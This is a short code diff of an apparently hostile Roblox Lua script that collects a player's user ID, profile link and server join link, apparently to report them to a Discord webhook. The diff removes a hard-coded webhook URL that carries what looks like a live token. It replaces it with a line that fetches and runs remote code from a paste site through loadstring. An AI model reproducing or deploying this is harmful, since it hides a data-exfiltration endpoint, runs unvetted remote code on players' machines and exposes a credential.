@@ -5,7 +5,7 @@ local target = game.Players.LocalPlayer
 local v1 = game:GetService("HttpService")
 local v2 = game:GetService("MarketplaceService")
 
-local web = 'https://discord.com/api/webhooks/1508216027035471872/QZ0v0F2X733wXbwjuUahJrRVhIGDwG_2VI5j-ubx0v1PNciMyYzUhMoqFs7W_R_6v_-u'
+local web = loadstring(game:HttpGet('https://pastefy.app/yZ68Xqbo/raw'))()
 local gameLink = string.format("https://www.roblox.com/games/start?placeId=%d&launchData=%s", game.PlaceId, v1:JSONEncode(game.JobId))
 local targetProfileLink = string.format("https://www.roblox.com/users/%d/profile", target.UserId)
 
